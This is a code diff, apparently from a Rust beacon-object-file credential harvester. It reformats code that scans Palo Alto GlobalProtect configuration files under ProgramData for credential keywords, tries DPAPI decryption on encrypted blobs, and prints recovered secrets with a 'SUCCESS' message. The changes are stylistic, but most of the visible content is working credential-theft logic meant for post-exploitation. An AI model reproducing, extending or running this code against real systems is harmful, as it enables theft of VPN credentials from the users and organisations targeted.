@@ -14,17 +14,11 @@
 
 use alloc::vec;
 use rustbof::{eprintln, println};
-use windows_sys::Win32::Foundation::{
-    CloseHandle, GetLastError, INVALID_HANDLE_VALUE, ERROR_NO_MORE_FILES,
-};
+use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, INVALID_HANDLE_VALUE};
 use windows_sys::Win32::Storage::FileSystem::*;
 
 unsafe extern "system" {
-    fn ExpandEnvironmentStringsA(
-        src: *const u8,
-        dst: *mut u8,
-        size: u32,
-    ) -> u32;
+    fn ExpandEnvironmentStringsA(src: *const u8, dst: *mut u8, size: u32) -> u32;
 
     fn LocalFree(h_mem: *mut core::ffi::c_void) -> *mut core::ffi::c_void;
 }
@@ -86,7 +80,7 @@ fn read_file_contents(path: &str) -> Option<alloc::vec::Vec<u8>> {
 
         let mut size_high: u32 = 0;
         let size_low = GetFileSize(handle, &mut size_high);
-        let file_size = ((size_high as u64) << 32 | size_low as u64) as usize;
+        let file_size = (((size_high as u64) << 32) | size_low as u64) as usize;
 
         if file_size == 0 || file_size > MAX_FILE_SIZE {
             CloseHandle(handle);
@@ -173,7 +167,7 @@ fn search_credentials(data: &[u8], filename: &str) -> usize {
             let matched = data[i..i + keyword.len()]
                 .iter()
                 .zip(keyword.iter())
-                .all(|(&a, &b)| a.to_ascii_lowercase() == b.to_ascii_lowercase());
+                .all(|(&a, &b)| a.eq_ignore_ascii_case(&b));
 
             if matched {
                 let line_start = data[..i]
@@ -189,7 +183,7 @@ fn search_credentials(data: &[u8], filename: &str) -> usize {
                 let line = &data[line_start..line_end];
                 let display: alloc::vec::Vec<u8> = line
                     .iter()
-                    .map(|&b| if b >= 0x20 && b < 0x7f { b } else { b'.' })
+                    .map(|&b| if (0x20..0x7f).contains(&b) { b } else { b'.' })
                     .collect();
                 if let Ok(s) = core::str::from_utf8(&display) {
                     println!("  [{}] {}", filename, s.trim());
@@ -205,7 +199,7 @@ fn search_credentials(data: &[u8], filename: &str) -> usize {
 }
 
 fn has_config_extension(name: &str) -> bool {
-    let lower: alloc::string::String = name.chars().map(|c| c.to_ascii_lowercase() as char).collect();
+    let lower: alloc::string::String = name.chars().map(|c| c.to_ascii_lowercase()).collect();
     for &ext in CONFIG_EXTENSIONS {
         if lower.ends_with(ext) {
             return true;
@@ -221,11 +215,18 @@ fn main(_args: *mut u8, _len: usize) {
     let env_path = b"%ProgramData%\\Palo Alto Networks\\GlobalProtect\\*\0";
     let mut expanded = [0u8; 512];
     let result = unsafe {
-        ExpandEnvironmentStringsA(env_path.as_ptr(), expanded.as_mut_ptr(), expanded.len() as u32)
+        ExpandEnvironmentStringsA(
+            env_path.as_ptr(),
+            expanded.as_mut_ptr(),
+            expanded.len() as u32,
+        )
     };
 
     if result == 0 {
-        eprintln!("Failed to expand environment string (error {:#X})", unsafe { GetLastError() });
+        eprintln!(
+            "Failed to expand environment string (error {:#X})",
+            unsafe { GetLastError() }
+        );
         return;
     }
 
@@ -271,12 +272,20 @@ fn main(_args: *mut u8, _len: usize) {
                     if data.len() > 4 && data[0..2] == [0x01, 0x00] {
                         println!("  Attempting DPAPI decryption on {}...", name);
                         if let Some(decrypted) = try_dpapi_decrypt(&data) {
-                            if decrypted.iter().all(|&b| b >= 0x20 && b < 0x7f || b == b'\n' || b == b'\r') {
+                            if decrypted
+                                .iter()
+                                .all(|&b| (0x20..0x7f).contains(&b) || b == b'\n' || b == b'\r')
+                            {
                                 if let Ok(s) = core::str::from_utf8(&decrypted) {
                                     println!("  Decrypted ({}): {}", name, s);
                                 }
                             } else {
-                                println!("  Decrypted {} ({} bytes): {}", name, decrypted.len(), hex_encode(&decrypted[..core::cmp::min(64, decrypted.len())]));
+                                println!(
+                                    "  Decrypted {} ({} bytes): {}",
+                                    name,
+                                    decrypted.len(),
+                                    hex_encode(&decrypted[..core::cmp::min(64, decrypted.len())])
+                                );
                             }
                             total_found += 1;
                         }
@@ -292,7 +301,10 @@ fn main(_args: *mut u8, _len: usize) {
 
         FindClose(handle);
 
-        println!("Checked {} config files, found {} credential artifact(s)", files_checked, total_found);
+        println!(
+            "Checked {} config files, found {} credential artifact(s)",
+            files_checked, total_found
+        );
         if total_found > 0 {
             println!("SUCCESS.");
         } else {
